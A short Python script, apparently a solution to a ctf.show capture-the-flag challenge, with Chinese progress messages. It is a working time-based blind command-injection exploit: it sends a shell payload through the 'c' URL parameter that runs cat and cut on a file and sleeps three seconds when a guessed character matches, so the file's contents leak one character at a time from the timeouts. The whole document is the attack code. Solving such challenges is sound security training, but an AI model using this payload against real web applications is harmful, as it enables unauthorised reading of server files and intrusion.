import requests
import time
import string

strs = string.digits + string.ascii_lowercase + "-"
result = ""
key = 0
for j in range(1, 45):
    print(f'第{j}次测试')
    if key == 1:
        break
    for n in strs:
        payload = "if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j, n)
        # print(payload)
        url = "http://2b4e4861-a7bf-4e6e-a8c0-b3d76eeed9dd.chall.ctf.show/?c=" + payload
        try:
            requests.get(url, timeout=(2.5, 2.5))
        except:
            result = result + n
            print(f'第{j}测试结果{result}')
            break
